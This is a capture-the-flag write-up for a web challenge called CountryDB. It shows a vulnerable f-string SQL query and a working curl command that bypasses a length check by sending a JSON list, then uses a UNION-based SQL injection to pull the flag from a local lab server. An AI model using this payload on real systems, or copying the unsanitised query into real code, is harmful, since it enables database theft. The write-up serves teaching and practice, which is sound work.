# CountryDB

This is a very simple web application which takes a country code and returns the country name and flag emoji. Looking at the source code in `app.py`, we see that there is a `/api/search` endpoint which takes a `code` parameter and returns a JSON response. The app checks if the length of this parameter is equal to 2 and then passes that into the `db_search` function which executes the following SQL Query:
    
```sql
cur.execute(f"SELECT name FROM country WHERE code=UPPER('{code}')")
```
We have an sql injection here because the `code` parameter is not sanitized.

In order to pass the `len(code) != 2` check, we can make the code parameter a list with two elements instead of a string which will pass the check. We can then use a union based sql injection to get the flag.

```bash
$ curl -X POST -H 'Content-Type: application/json' http://localhost:8020/api/search -d $'{"code":["\') UNION SELECT flag FROM flag -- - ","123"]}'

{"name":"FakeCTF{*** REDACTED ***}"}
```